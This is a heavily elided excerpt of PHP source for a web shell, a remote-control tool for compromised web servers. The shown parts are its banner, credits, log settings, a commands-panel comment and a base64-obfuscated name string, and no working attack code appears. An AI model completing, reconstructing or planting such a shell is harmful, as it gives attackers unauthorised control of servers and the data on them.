<?php
#######################################
## WEBSHELL, PHP WEB SHELL,BEST SHELL##
define('sh_ver',"2012");             ##
## By PHP WEB SHELL DEVELOPER        ##
##    PHP WEB SHELL Community        ##
...
$tmpdir = "";
$tmpdir_logs = "./";
$log_email = "DO_NOT_MAIL@hotmail.com";
...
if ($act == "about") {
  echo "<center><b>Credits:</b><br>Idea, leading and coding by <b>tristram [CCTeaM]</b><br>".
       ...
       "Report bugs to <a href=\"mailto:DO_NOT_MAIL@gmail.com\">FaTaLisTiCz_Fx</a></b>";
}
echo "</td></tr></table>\n";
/*** COMMANDS PANEL ***/
?>
...
function sh_name() { return base64_decode("UEhQIFdFQlNIRUxMIHY=").sh_ver; }
